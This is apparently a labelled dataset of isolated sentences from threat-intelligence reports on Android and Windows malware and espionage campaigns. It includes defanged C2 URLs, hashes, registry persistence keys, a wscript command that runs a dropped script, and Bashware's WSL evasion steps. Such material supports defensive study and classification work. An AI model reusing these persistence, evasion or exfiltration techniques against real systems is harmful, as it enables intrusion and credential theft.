1	The miner will identify itself to the mining pool with this name and send the actor information about the mining.
1	Once ExpensiveWall is downloaded, it requests several common permissions, including internet access  which allows the app to connect to its C&C server  and SMS permissions  which enable it to send premium SMS messages and register users for other paid services all without the users knowledge.
1	After it is installed and granted the necessary permissions, ExpensiveWall sends data about the infected device to its C&C server, including its location and unique identifiers, such as MAC and IP addresses, IMSI, and IMEI.
1	Each time the device is switched on, or experiences a connectivity change, the app connects to its C&C server and receives a URL, which it opens in an embedded WebView.
1	The malware obtains the devices phone number and uses it to subscribe the user to different paid services, such as the example below:
1	In other cases, the malware presents the user with a button called Continue, and once the user clicks the button, the malware sends a premium SMS on his behalf.
1	During lateral movement in a victims network, the attackers deploy a module to actively scan the local area network, find hosts vulnerable for MS08-067 (the vulnerability exploited by Conficker) or accessible with admin credentials from its own password database.
1	The malicious code was delivered via e-mail as attachments (Microsoft Excel, Word and, probably PDF documents) which were rigged with exploit code for known security vulnerabilities in the mentioned applications.
1	In addition to Office documents (CVE-2009-3129, CVE-2010-3333, CVE-2012-0158), it appears that the attackers also infiltrated victim network(s) via Java exploitation (known as the Rhino exploit (CVE-2011-3544).
1	Right after the victim opened the malicious document or visit malicious URL on a vulnerable system, the embedded malicious code initiated the setup of the main component which in turn handled further communication with the C&C servers.
1	Next, the system receives a number of additional spy modules from the C&C server, including modules to handle infection of smartphones.
1	All gathered information is packed, encrypted and only then transferred to the C&C server.
1	As a notable fact, the attackers used exploit code that was made public and originally came from a previously known targeted attack campaign with Chinese origins.
1	The only thing that was changed is the executable which was embedded in the document; the attackers replaced it with their own code.
1	The embedded executable is a file-dropper, which extracts and runs three additional files.
1	%TEMP%MSC.BAT
1	%ProgramFiles%WINDOWS NTLHAFD.GCP (<- This file name varies)
1	%ProgramFiles%WINDOWS NTSVCHOST.EXE
1	This file is essentially a backdoor, which is decoded by the loader module (svchost.exe).
1	The decrypted file is injected into system memory and is responsible for communication with the C&C server.
1	On any infected system, every major task is performed by the main backdoor component.
1	The main component is started only after its loader (svchost.exe) checks if the internet connection is available.
1	After the Internet connection is validated, the loader executes the main backdoor component that connects to its C&C servers:
1	Capture of malwares communication with the C2
1	The connections with the C&C are encrypted  different encryption algorithms are used to send and receive data.
1	After a connection with the C&C server is established, the backdoor starts the communication process, which leads to the loading of additional modules.
1	Offline: exists as files on local disk, capable of creating its own system registry keys, local disk log files, and may communicate with C&C servers on their own.
1	Online: exists only in system memory and is never saved to local disk, do not create registry keys, all logs are also kept in memory instead of local disk and sends the result of work to the C&C server using own code.
1	The document may be sent to the victim via e-mail.
1	However, like with exploit case, the document will be instantly processed by the module and the module will start a malicious application attached to the document.
1	This trick can be used to regain access to the infected machines in case of unexpected C&C servers shutdown/takeover.
1	The script responsible for redirections was found in /root/scp.pl and relies on the socat tool for stream redirection.
1	For instance, the script /cgi-bin/nt/th is being used to receive commands from the command-and-control server, usually in the form of new plugins to run on the victims computer.
1	The /cgi-bin/nt/sk script is called by the running plugins to upload stolen data and information about the victim.
1	When connecting to the C&C, the backdoor identifies itself with a specific string which includes a hexadecimal value that appears to be the victims unique ID.
1	Step 1: Loading WSL components
1	This way, by running a single command line silently in the background, invisible to the user, Bashware loads the WSL components and is ready to move on to the next step.
1	Step 2: Enabling developer mode
1	However, its a little known fact that all it takes to enter developer mode is setting these registry keys:
1	HKLM \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ AppModelUnlock \ AllowAllTrustedApps
1	HKLM \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ 
1	Once Bashwares operations are complete, the keys are turned back off making this operation practically invisible.
1	Step 3: Installing Linux
1	The next step for Bashware is to download and extract the Linux file system from Microsofts servers.
1	The user management installation is done by Lxrun, using the /install option.
1	Lxrun command-line interface downloads and installs the file system on Windows PC.
1	Bashware uses the Lxrun.exe utility, which downloads the Linux file system from Microsoft servers.
1	Step 4: Wine
1	Bashware uses the Winehq project capabilities and installs a pre-optimized wine project into the WSL Linux environment.
1	Next, EXE formats need to be converted by Wine, turning its NT syscalls to POSIX syscalls.
1	Later on, the Pico provider (lxcore.sys) will convert these POSIX syscalls back to NT syscalls, turning lxcore to the actual caller of this process.
1	This way, a file running on the Windows OS can execute any known malicious payload from the Linux OS, where it remains hidden from most security products.
1	During WSLs installation process, LxRun.exe is responsible for downloading and extracting the Linux file system from Microsofts servers.
1	Under the hood, the filesystem is saved in a hidden folder under %APPDAT% directory as a file named lxss.tar.gz.
1	After saving the filesystem archive, LxRun.exe then continues to extract it into the same directory.
1	After this task is finished, the hidden folder contains a full Linux file system, later used by WSL, and more specifically by BASH.exe.
1	Luckily for us, Microsoft calculates a SHA256 for the downloaded file system, which saves the hash value into a file right after the download process is complete and before extraction begins.
1	When a user wishes to use WSL, he runs Bash.exe, which is executed with the users permission.
1	In every WSL run, NTFS partitions are automatically mounted under /mnt in the Linux environment, granting the ability to read write and execute NTFS from within the WSL.
1	Figure 4: Trying to write a file into System32 directory from within the Linux environment  unprivileged Bash.exe
1	If a threat actor utilizes an admin token to launch Bash.exe, then Bash.exe + children will execute with full Admin token, including all privileges causing UAC bypass on the Windows side and full privilege escalation on the Linux side.
1	WSL contains both user mode and kernel mode components:
1	User mode session manager service, which handles the Linux instance life cycle (LxssManager.exe).
1	Pico provider drivers (lxss.sys, lxcore.sys) that emulatea Linux kernel by translating Linux system calls.
1	Pico processes (Minimal processes) that host the unmodified Linux executable (e.g./bin/bash).
1	Despite being virtually empty if examined from within the Windows OS, Pico processes have the ability to interact with a WindowsNT Kernel.
1	The interaction is achieved by the Pico provider  a special driver which is responsible for the transition from Linux ELF to a running Windows executable.
1	WSL uses Pico processes as containers for native Linux binaries.
1	Pico processes are being monitored and serviced by a kernel component called Pico Provider (implemented in lxcore.sys).
1	The Pico Provider driver dispatches system calls and user mode exceptions made by the various Pico Processes.
1	WSL executes unmodified Linux ELF64 binaries, by virtualizing a Linux kernel interface on top of the WindowsNT kernel.One of the kernel interfaces that it exposes are system calls (syscalls), a service provided by the kernel that can be called from user mode.
1	The Windows Subsystem for Linux includes kernel mode drivers (lxss.sys and lxcore.sys).
1	When a syscall instruction is made, the NT kernel detects that the request came from a Pico process.
1	Since the NT kernel does not know how to handle syscalls from Pico processes, it saves off the register state and forwards the request to the Pico driver (lxcore.sys).
1	After the Pico driver has handled the syscall, it returns to the NT Kernel, which restores the register state, places the return value in rax, and invokes the sysret\iretq instruction to return to user mode.
1	While running the Bash terminal, there are numerous procedures running under the hood of Windows OS:
1	exe  a Windows launcher service that communicates with the LxssManager.exe and spawns a new instance of WSL, executing the desired process.
1	exe  a user-mode management service (the LxssManager.dll service living in SVCHOST.exe), which provides an external-facing COM interface, passing information to the Pico Provider through its Device Object.
1	Pico Provider driver (LXSS.SYS / LXCORE.SYS) which provides the kernel-mode implementation of a Linux-compatible Kernel ABI and API, as well as a Device Object (\Device\lxss) for command & control.
1	This Linux instance enables running ELF binaries through an interface which lxcore.sys exports.
1	Lxcore.sys intercepts all ELF syscalls and adapts them into NT syscalls.
1	The LokiBot sample [SHA256: 691c65e4fb1d19f82465df1d34ad51aaeceba14a78167262dc7b2840a6a6aa87] has a file size of 286 KB and was recently compiled on Aug 21, which is coincidentally the same date as when the malicious spam was sent.
1	The file creates a directory %appdata%\[6 random hex chars]
1	It will then: add attribute FILE_ATTRIBUTE_HIDDEN, add attribute FILE_ATTRIBUTE_SYSTEM, add attribute FILE_NOT_CONTENT_INDEXED, copies itself to %appdata%\[6 random hex chars]\[6 different random hex chars]\.exe, add attribute FILE_ATTRIBUTE_HIDDEN, add attribute FILE_ATTRIBUTE_SYSTEM, add attribute FILE_NOT_CONTENT_INDEXED, create mutex: 2B1733F511B2DFE5171B9AA1
1	Once these changes are made, it then deletes itself.
1	Ultimately, it will connect via POST: hxxp://palikyu.ml/alpha/fre.php, 104.31.95.221 (aug 22, 2019 CloudFare Inc.), Palikyu.ml and Palikyu.tk
1	Another interesting behavior to note is that the domain contacts Palikyu.ml  specifically, hxxp://palikyu.ml/alpha/fre.php (104.31.95.221).
1	RFQE67Y54.7z file
1	T1204: User Execution - File is unzipped and executed by user via deception (LokiBot)
1	T1107: File Deletion - deletes original file after infection
1	T1158: Hidden Files and Directories - creates custom directory %appdata%\[6 random hex chars] with the following attributes
1	T1158: Hidden Files and Directories - creates custom directory %appdata%\[6 random hex chars] with the following attributes
1	moves self to %appdata%\[6 random hex chars]\[6 different random hex chars].exe with the following attributes:
1	T1045: Software Packing - threat comes packed/encrypted
1	T1003: Credential Dumping
1	T1081: Credentials in Files
1	Threat tries to steal credentials from various software programs
1	T1214: Credentials in Registry
1	Threat tries to steal credentials from various software programs
1	T1005: Data from Local System
1	Threat tries to steal credentials from various software programs
1	T1002: Data Compressed
1	Threat compresses stolen data before sending it over to URL
1	T1043: Commonly Used Port
1	Threat uses port 80 for communications (hxxp://palikyu.ml/alpha/fre.php)
1	T1071: Standard Application Layer Protocol
1	Threat uses standard HTTP over port 80 (hxxp://palikyu.ml/alpha/fre.php)
1	Known Defenses and Mitigations
1	Initial Access: FortiMail or other mail solutions can be used to block specific file types.
1	The first interesting function that is executed is _attachBaseContext(Context base).
1	This function accesses the configuration file contained in the asset folder of the APK.
1	Figure 1: Creation of fake Dex files
1	It then checks the payloadType value, and if the value is equal to 1, it will copy the asset data to another folder.
1	Otherwise, it will proceed without moving anything, as it uses the classes.dex file loaded in memory instead.
1	Figure 2: Extraction of Dex encrypted file
1	The native JNI_OnLoad function, which is run when the library is loaded, registers the native functions declared in JNITools, allowing them to be called differently than the usual scheme of Java_<className>_<FunctionName>, probably to make the reversing process harder.
1	If the value of the configuration variable type is different from 0 (which means the payload needs to be decrypted), the code accesses the folder /data/data/<appname>/app_csn0/ and creates a folder .unzip in it.
1	The decryption routines are run on a file generated from the encrypted payload data.
1	In the first case, the packer accesses the /proc/<pid>/maps file to locate the memory where the classes.dex file is loaded, and then looks for a specific set of characters in memory that identify the beginning of the encrypted data.
1	When found, it starts copying from that point onwards.
1	These routines then generate a classes.dex payload file that is loaded by the ClassLoader.
1	In the sample analysed, the payload consisted of two .dex files.
1	The server address is not hardcoded in the `classes.dex` file, but it is retrieved during execution.
1	The code executes the function `GprcsUtils.Regist_Server(String str)`, which calls `UrlTool.loadIPAddrFromIns()` to extract the C2 URL.
1	Figure 8: Loaded IP from Instagram
1	Much like Anubis used to do with fake Telegram and Twitter accounts, this malware uses social media to obtain its C2: it downloads the webpage of a photo-less Instagram account.
1	It then extracts the biography field of this account and decodes it using Base64.
1	Figure 9: Fake Instagram account
1	Finally, the resulting string is decrypted using DES and a key is generated using the value `d2a57dc1d883fd21fb9951699df71cc7` as its seed (which happens to be the MD5 hash corresponding to the word app), which can be seen in figure 8 under the String variable str3.
1	The resulting URL is 149.28.24.166:11257 and the fake accounts have been reported to Instagram.
1	After the connection to the server is started, the malware proceeds to collect and send the following information about the device:
1	After having sent all of the devices contacts to the C2, it waits for it to respond with a telephone number and a message body to construct an SMS.
1	It is interesting to note that the malware identifies the provider of the SIM card and looks specifically for a specific Japanese telecommunication provider.
1	To do so, it checks the IMSI (International Mobile Subscriber Identity) value of the device.
1	The malware checks to see if the first half corresponds one of its listed values, which are all connected to the aforementioned provider.
1	Figure 10: Checking if the device is served by a specific provider
1	Instead, if the function `is<Provider>()` returns true, then the malware simply proceeds to increase the value controlling the maximum number of SMS messages it allows itself to send.
1	Finally, the malware is able to set itself as the default SMS handler application, and uses this to upload to the C2 all the received messages.
1	This malicious Word document file takes a form of a Compensation Request Form, and what is different from existing file is that it performs malicious External connection and uses VBA macro simultaneously.
1	As shown in the Figure 1 (document.xml.rels), it attempts to connect to the malicious URL specified as External, and operates the malicious VBA macro configured in settings.yml which is situated within the document.
1	External malicious URL: hxxp://ftcpark59.getenjoyment.net/1703/blank.php?v=sakimName of the file with VBA macro code: settings.yml
1	Normally, when a VBA macro is created within a Word file, a file named vbaProject.bin is created, but it is speculated that for this malicious Word file, the attacker intentionally made it with filename of settings.yml.
1	This document file was created to prompt users to enter personal information and account number for retrieval of the compensation.
1	ASEC analysis team believe that the attacker intentionally designed the document this way to prompt user to enable malicious behaviors.
1	Configure office security settings so that the macro can be executed at all times (Registry value change).
1	Upon accessing the URL, transmit (leak) information including names of running services and processes.
1	Malicious URL to access macro: hxxp://ftcpark59.getenjoyment.net/1703/v.php?w=sakim&v=Extract names of running services and processes then attempt to connect after respectively attaching extracted information behind the URL (URL/Service Name/Process Name)
1	It is assumed that the malware will follow the attackers directive and download additional file in certain environment where C2 is connected.
1	The process of getting the server address is as follows:Like most of the credential stealers, the client (i.e.the attacker) can customize his or her own configuration for the stealer functionality, which can be saved in the binary built by the malware or in the C&C server, and sent back to the malware when executing.
1	In Raccoon, after the client chooses the configuration, the malware builder generates a configuration ID for the clients configuration and writes this ID to the compiled malware.
1	In this case, the config ID is encrypted, Raccoon has another hardcoded base-64 encoded string in the binary.
1	To decrypt the config ID, it uses the first key ([emailprotected]*@45) and, after the decryption routine, gets the config ID (which is, in this case, 4ede41fe0ea963034a3d65f0dd442de4671c214f).To get the full configuration, the stealer has to query the C&C.
1	The C&C server returns JSON that contains the configuration the stealer needs for its functionality.
1	Raccoon targets a wide range of applications and uses known techniques in order to extract sensitive data from those applications.
1	In order to extract and decrypt the credentials from the applications, Raccoon downloads the specific DLLs for the applications.
1	The config JSON contains a URL from where the malware will download those libraries.
1	Most of the stealers, like Raccoon, perform SQL queries using sqlite3.dll in order to get the user autologin passwords, credit card information, cookies and browser history.
1	The stealer also relies on the same methodology for Mozilla based applications.
1	The stealer targets four Mozilla-based browsers including Firefox and SeaMonkey, (full list below) and one Mozilla-based email client, ThunderBird.
1	For those applications, the stealer extracts and decrypts sensitive data like username and password, cookies and history.
1	In order to do so, Raccoon downloads a zip file containing a lot of DLLs for decrypting protected data.
1	By using functions from nss3.dll, the malware is able to decrypt and extract the data from the SQLite databases and the JSON login file.
1	When looking for cryptocurrency wallets, Racoon targets popular applications like Exodus, Jaxx and more.
1	Like most stealers, Raccoon is looking for those wallet files in the default application locations, but it also has a wallet scanning feature that allows it to grab any wallet.dat file.
1	The malware gathers information about the machine like the OS arch and version, system language, hardware information and installed applications.
1	In addition, it can take screenshots from the users machine if that was enabled by the attackers configuration.
1	After fulfilling all its stealing capabilities, Raccoon gathers all the files that it wrote to the temp folder into one zip file named Log.zip.
1	Now all it has to do is send the zip file back to the C&C server and delete all traces of itself.
1	It downloads malicious files and runs them.
1	In this case, the dropper feature is disabled by the config JSON, but when it is enabled, Raccoon takes the URLs from the loader_urls key, downloads the file to the temp folder and executes it by calling to ShellExecuteA with the file path.
1	Since we started the analysis of this sample, the Raccoon team members have improved the stealer and released new versions for the build, including the apability to steal FTP server credentials from FileZilla application and login credentials from a Chinese UC Browser.
1	In addition, the attacker panel has been improved, some UI issues were fixed and the authors added an option to encrypt the builds right from the panel and downloaded it as a DLL.
1	A Flash exploit targeting the vulnerability labeled CVE-2015-5119.
1	It allows an attacker to execute arbitrary code remotely, if the attacker can convince the potential victim to open a specially crafted Flash file.
1	Strikingly, the exploit works against all major browsers and can also be deployed easily in Microsoft Office documents (Word, Excel, PowerPoint).
1	Hacking Teams leaked data contain various tools for easy manipulation of the Flash exploit, and therefore it does not come as a surprise that various exploit kits integrated it very rapidly, as reported by the security researcher Kafeine.
1	This exploit allows an attacker to execute a program with maximum privileges.
1	Hence, the Hacking Team leak provides a complete exploitation chain, starting from a Flash exploit for the compromise, to a Windows escalation privilege exploit allowing the payload execution with elevated privileges.
1	The target receives a spear-phishing email containing an URL pointing to a domain name mimicking a legitimate domain name.
1	In this particular case, we observed the domain osce-press.org being used, which mimics osce.org/press.
1	If the target opens the URL, the browser hits a landing page with JavaScript code, which collects detailed information on the computer.
1	If the computer matches certain criteria set by the Sednit operators (language, timezone), the server then serves an exploit to the target.
1	Since Wednesday, a Flash exploit is delivered under the name flash_video_x86.swf.
1	The decompiled code of the exploit is almost the same as the Hacking Team exploit  more precisely, the version dubbed scratch_ie_ff_bytearray in the leaked data.
1	The only difference between the two exploits appears to be that the Sednit version receives the shellcode to execute in an input parameter in a manner similar to Metasploit exploits, whereas in the Hacking Team version the shellcode is hardcoded in the Flash file.
1	If the Flash exploitation works, the victim receives a first-stage backdoor  malware whose purpose is to make sure the victim is the intended target.
1	This malware contains Hacking Teams Windows escalation privilege exploit.
1	If the privilege escalation exploit works, the malware then sets its persistence on the machine through a scheduled task running with the highest privileges.
1	One of our users notified us of a suspicious document in the archive which is detected by our anti-malware products as Exploit.JS.Pdfka.ffw.
1	Technical Details  964.PDF
1	The targeted e-mail contains a PDF file named 964.PDF, which is 569,477 bytes in size (MD5: cbf76a32de0738fea7073b3d4b3f1d60).
1	This PDF file contains an exploit (CVE-2010-0188) for Adobe Reader 8.x before 8.2.1 and 9.x before 9.3.1.
1	The PDF has an embedded Javascript code which exploits the vulnerability and passes execution to the shellcode.
1	When the shellcode is executed, it parses the command line of the current process (Adobe Reader), skips the first substring surrounded with double quotes and extracts the second substring surrounded with double quotes character.
1	Next, it copies the source PDF to %TEMP%1.dat and reads the 1.dat file.
1	It reads 0x8A218 bytes (this value is hardcoded) from offset 0xD98 (hardcoded as well).
1	This new data block starts from a size of a payload stored in DWORD value of 0xCF00.
1	The first part of the payload is decrypted using simple ROL+XOR (position-dependent).
1	The decrypted file is saved into %TEMP%explorer.exe and then it is executed.
1	Right after that, the second part of the payload is similarly decrypted.
1	It is dumped to %TEMP%964.PDF (file name is hardcoded).
1	After this, the shellcode spawns a new Adobe Reader process to open the dumped PDF file, removes %TEMP%1.dat and terminates the current process.
1	The malware dropped by the PDF exploit is detected by Kaspersky Lab products as Trojan-PSW.Win32.Quarian.j.
1	After start of execution the malware installs current module in system Autorun using the following registry value:
1	HKCUSOFTWAREMicrosoftWindowsCurrentVersionRunalg = %Path to Self%
1	To ensure there is single instance of current application, it creates a mutex named windowsupdataguoDL, if it failed to create the mutex and the last error is ERROR_ALREADY_EXISTS it instantly stops execution.
1	The malware also attempts to read first 4 bytes from file named cf (in the current directory).
1	Next, it decrypts hardcoded C&C server address using simple XOR (with position and value 0x44) and starts a new C&C communication thread.
1	The malware obtains current user preferences from HKCUSOFTWAREMicrosoftWindowsCurrentVersionInternet Settings registry key using values ProxyEnable, User Agent, ProxyServer.
1	It also tries to fetch current proxy preferences from Firefox settings by parsing %APPDATA%MozillaFireFoxProfilesprefs.js file and extracting the following values:
1	According to decrypted hardcoded data, current samples C&C is located at sureshreddy1.dns05.com, on port 443 (HTTPs).
1	In case of local Proxy Server response HTTP 407 (Authorization Required) it checks Windows Protected Storage in order to fetch stored password for current proxy.
1	For communication with C&C the malware uses custom protocol and simple incremental single byte XOR encryption.
1	Communication starts from a handshake which consists of 8 random bytes sent to the server and 8 bytes in response.
1	In case of proxy it establishes connection via HTTP CONNECT method.
1	If authorization is required the malware uses obtained login and password for current proxy and attempts to do Basic proxy authentication.
1	Next, the malware waits for a response from the server (using TCP connection in Keep Alive mode).
1	Simply run updater.exe from current directory.
1	Remove the alg entry from HKCUSOFTWAREMicrosoftWindowsCurrentVersionRun.
1	Creates a new thread and connects to the C&C in a separate session, following same procedure described above.
1	Copies %WINDIR%system32cmd.exe to %WINDIR%alg.exe and starts a new process from any of the mentioned paths.
1	The attacker can interactively work with cmd.exe, everything he types is encrypted and sent to the malware via C&C server, everything cmd.exe outputs is encrypted and instantly sent to the C&C.
1	Creates a new thread which establishes additional connection with the C&C and provides own set of operations which include: Get directory listing, Move files, Download file from attackers system to local system, Upload file from attackers system to local system, Execute application file, Delete file
1	This command is used to change value in cf file and alter delay between connections to the C&C.
1	The command-and-control server name resolves to 123.120.111.163, which is in China:
1	At the start time of writing, the C&C at 123.120.11.163 server didnt not answer to connection attempts on port 443, however the next day when we still were working on this report the domain resolution changed to 123.120.110.126 (same ISP), which is alive and responds on port 443.
1	Today, DOC (Word) documents containing North Korea related materials collected by ASEC analysis team will partially be introduced.
1	Upon opening, it connects to External URL and download additional document files via code written within XML.
1	Inside the document, there exists the following XML file inside to download and connect additional malicious macro word document via External.
1	The document file downloaded from hxxp://www.inonix.co.kr/kor/board/widgets/mcontent/skins/tmp?q=6 that attempts to connect to the target is also a word document and contains a malicious macro.
1	The macro code is obfuscated as shown below and when it is run, the code creates a malicious xml inside the template folder where basic office users template files are located and runs it.
1	Command: wscript.exe //e:vbscript //b C:\Users\[user name]\AppData\Roaming\Microsoft\Templates\1589989024.xml
1	As shown in the figure above, the created xml file attempts to access to the additional malicious network address.
1	Summary on C2 in the two documents are shown below, and it is assumed that their goal is to additionally download malware and run it.
1	[Document 2] also has a malicious macro word document of intermediate stage.
1	[Document 1] Filename: Questionnaire.docx Download address for additional DOC word file after connecting to XML External: hxxp://www.inonix.co.kr/kor/board/widgets/mcontent/skins/tmp?q=6 Additional access address for XML created from document above:hxxp://heritage2020.cafe24.com/skin/board/gallery/log/list.php?query=1
1	[Document 2] Filename: Business Report.docx Download address for additional DOC word file after connecting to XML External:hxxp://koreacit.co.kr/skin/new/basic/update/temp?q=6 Additional access address for XML created from document above:hxxp://koreacit.co.kr/skin/new/basic/update/list.php?query=1
1	The first is a JScript Remote Access Trojan (RAT) that ensures persistence on the target system and then uses encoded network connection to connect to the attacker.
1	After that, the attacker can execute arbitrary commands on the target machine to have potentially full control of it.
1	The second is an AutoIT downloader that uses network connection and script functions to download and execute malware, which could be used to infect targeted systems with malware such as ransomware, spyware and so on.
1	We observed the c.js JScript RAT downloaded from the assurancetemporaireenligne[.]com domain on April 18.
1	The PowerShell command used by the exploit of the CVE-2019-0752 vulnerability can be found in Figure 1.
1	Command used to download and launch the JScript RAT sample.
1	Deobfuscated c.js script, part one.
1	Figure 3 shows that the code stored in data1 is put in the HKCU\Software\loaderName register key and the code stored in data2 is encoded using the EncodeScriptFile function and written into the loader.jse file.
1	The path to the loader.jse script is then passed to the HKCU\Software\Microsoft\Windows\CurrentVersion\Run register key and never used again after that (we will give more details about this behavior in the next section).
1	There is also a host variable initialized with the hxxp://seemee[.]ddns[.]net/loader/loader2/www URL.
1	Finally, the loader.jse is run and c.js deletes itself.
1	Deobfuscated c.js script, part two.
1	First, the c.js script creates and sets a new value for the registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
1	The Run key causes programs to run each time that a user logs on, and so the loader.jse script, which is not created yet, will run automatically each time the Windows OS boots.
1	The next step of the persistence process of the c.js script is demonstrated in Figure 5, where the script creates the actual loader.jse file.
1	Figure 5 also shows that the loader.jse script is created in the AppData folder.
1	After the creation of the loader.jse file, the c.js script uses the open handle of this file, as shown in Figure 6, to put some code in it, as shown in Figure 7.
1	Thanks to the magic bytes #@~^ present at the beginning of the file, we can conclude that the loader.jse script has been encoded with Microsoft's script encoding.
1	Then, the encoded file is run via the ShellExecute function (Figure 8) and the c.js file deletes itself.
1	To do that, it uses the Windows registry key Run, and then it drops an encoded file, loader.jse, in a hidden folder before deleting itself.
1	Connection to the Remote Server
1	Before we can analyze the behavior of the loader.jse and the connection to the remote server, we have to go back to the c.js file execution.
1	Indeed, as we saw during our static analysis, this file also creates a registry key named HKCU\Software\loaderName and sets a value data in this key with some packed JScript code.
1	API Hook on RegSetValueExA during c.js file execution.
1	This step in the c.js execution is very important because when the loader.jse is run, it opens the registry key HKCU\Software\loaderName (Figure 10) and runs the code contained in the data value.
1	API Hook on RegOpenKeyExA during loader.jse file execution.
1	After the code unpacking, Figure 12 shows that a GET request is made to the loader.php page of the hxxp://seemee[.]ddns [.]net domain.
1	Another function with the ability to decode strings is used here to decode the response of the GET request.
1	The connection with the remote server is now set up, and so the malicious script will use the code received in the response to the GET request to connect to the cmd.php page, which is the panel where the attacker can choose commands to execute on the target machine.
1	Unpacked code executed by loader.jse.
1	The script contained in the requests response is an infinite loop that makes requests to the cmd.php page to retrieve indications of the tasks to execute (Figure 13).
1	The attacker can perform multiple tasks on the target system: execute commands, download files, reboot the Windows OS, terminate the current task and shut down the Windows OS (Figure 14).
1	Commands that can be executed on the target machine.
1	Shortly after the discovery of the JScript RAT, on April 30, 2020, we observed the 2.exe file downloaded from the dark[.]crypterfile[.]com domain using the same vulnerability CVE-2019-0752 (Figure 15).
1	Command used to download and launch the AutoIT downloader sample.
1	When Dino restarts, the module is deserialized from the file and loaded into memory.
1	Funnily enough, the key serving to encrypt the file on disk is PsmIsANiceM0du1eWith0SugarInside.
1	Dinos configuration is initially stored in a serialized DataStore object contained in a zip archive at the end of the Dino binary.
1	The three last keys are displayed with obfuscated names (xT0rvwz, tr4qa589 and jopcft4T) and store parameters for the custom file system we will describe later.
1	At runtime this object is deserialized and stored inside the CORE module.
1	Uninstall Dino using the custom file system (see ramFS description below for details)
1	Execute Windows batch command passed as a parameter
1	hange the current work directory
1	Retrieve the current work directory path
1	List files in a given directory with various additional information
1	Set or remove environment variables stored in the ENVVAR module
1	Display or update module content
1	Search for files whose names match given patterns.
1	The files found are packed in an archive, which is then scheduled for upload to the C&C using the FMGR module.
1	Create an archive from given file paths
1	Unpack an archive to a given location
1	Schedule a file transfer to the C&C using the FMGR module
1	Remove the next file transfer scheduled in the FMGR module
1	Remove all scheduled file transfers in the FMGR module
1	Schedule a command to be executed at a certain time by the CRONTAB module (see CRONTAB description below for details)
1	List registered entries in the CRONTAB module
1	Remove an entry in the CRONTAB module
1	Schedule a wake-up of the malware after a certain amount of time using the CRONTAB module
1	Display the public IP of the infected machine
1	Display information about the currently used C&C server
1	Display information about all known C&C servers
1	Download a file from the currently used C&C server onto the machine
1	Delay the de-installation of the malware, if scheduled
1	At startup Dino executes successively the commands stored in the InitialCommands field in its configuration; in the sample we analyzed they are:
1	Their execution is managed by the CMDEXEC module, the commands being stored in a queue inside the CMDEXECQ module.
1	The result is reported to the C&C server.
1	RamFS content is initially stored encrypted in Dinos configuration under the key xT0rvwz, whereas the corresponding RC4 key is stored under the key tr4qa589.
1	Once the file system has been decrypted, it is stored in memory as a linked list of 512-byte memory chunks, each one of them being individually RC4-encrypted.
1	When looking for a file in ramFS, each chunk is decrypted, processed and then re-encrypted.
1	Once decrypted, file content is manipulated as chunks of 540 bytes
1	Change the current work directory on the real file system
1	Installation or de-installation of Dino, in Windows registry and/or as a service
1	Extracts a file stored in ramFS onto the machine
1	Deletes a file stored on the machine
1	Executes a file stored in ramFS
1	Injects a file stored in ramFS into a running process
1	Sleeps for a given amount of time
1	Terminates a running process
1	Usage of ramFS in Dino
1	In the case of Dino, ramFS serves as protected storage for one specific file containing the instructions to remove the malware from the machine.
1	The developers named this file the cleaner and it is executed when Dino receives the command killBD (the BD acronym is the developers designation of the malware).
1	First, it retrieves the name of the file from Dinos configuration (a.ini), then it retrieves the key to decrypt ramFS, and it finally mounts the file system in memory in order to execute the cleaner file stored inside.
1	The cleaner file contains the string INSTALL -A wusvcd -U which, once executed, will uninstall the malware from the machine  wusvcd being the name used to register Dino on the machine.
1	The commands cronadd, cronlist and crondel serve respectively to add, list, and remove scheduled tasks registered in the CRONTAB module.
1	Finally, the Visibility field defines whether the command execution will be reported to the C&C (the other possible value being Silent).
1	A very similar check (against klavme, myapp, TESTAPP and afyjevmv.exe) is present in Bunny samples, and in some first-stage implants deployed by Animal Farm.
1	Unacev2.dll vulnerability PoC
1	The exploit drops three files on the file system.
1	First, the shortcut called Goggle Chrome.lnk is placed on the users desktop.
1	Next, the same shortcut is placed in the Startup folder at %AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Goggle Chrome.lnk.
1	The files in the startup folder will be executed once the user logs into the system.
1	And finally, the executable file called win.exe is placed in the users directory at %userprofile%\win.exe.
1	The file, dropped to the user folder, is a password-protected self-extracting RAR archive.
1	When the SFX archive is created, the compilation date is set close to the timestamp of the corresponding version of the WinRAR software used.
